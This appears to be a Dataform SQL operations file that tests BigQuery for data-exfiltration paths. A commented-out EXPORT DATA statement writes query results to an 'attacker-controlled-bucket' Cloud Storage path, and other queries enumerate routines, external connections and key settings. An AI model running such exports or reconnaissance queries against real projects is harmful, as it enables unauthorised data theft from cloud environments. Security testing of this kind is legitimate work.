-- BigQuery Exfiltration Test
-- Tests various BigQuery features for data exfiltration potential
-- Some of these queries may fail - the goal is to see what's possible

config {
  type: "operations",
  name: "bq_exfil_test",
  hasOutput: false
}

-- Test 1: Try to EXPORT DATA to external GCS bucket
-- This would work if service account has storage.objects.create on target bucket
-- EXPORT DATA OPTIONS(
--   uri='gs://attacker-controlled-bucket/exfil/*.csv',
--   format='CSV'
-- ) AS
-- SELECT * FROM `bigquery-public-data.samples.shakespeare` LIMIT 10;

-- Test 2: Query metadata about remote functions
SELECT
  routine_catalog,
  routine_schema,
  routine_name,
  routine_type,
  routine_definition
FROM `region-us`.INFORMATION_SCHEMA.ROUTINES
WHERE routine_type = 'FUNCTION'
LIMIT 100;

-- Test 3: Query external connections
-- SELECT * FROM `region-us`.INFORMATION_SCHEMA.EXTERNAL_CONNECTIONS;

-- Test 4: Query connected datasets info
-- SELECT * FROM INFORMATION_SCHEMA.SCHEMATA_OPTIONS
-- WHERE option_name = 'default_kms_key_name';

-- Test 5: Try BigQuery ML for external calls (if ML enabled)
-- This could potentially make HTTP calls during training
-- CREATE OR REPLACE MODEL `dataset.model`
-- OPTIONS(model_type='BOOSTED_TREE_CLASSIFIER') AS
-- SELECT * FROM table;
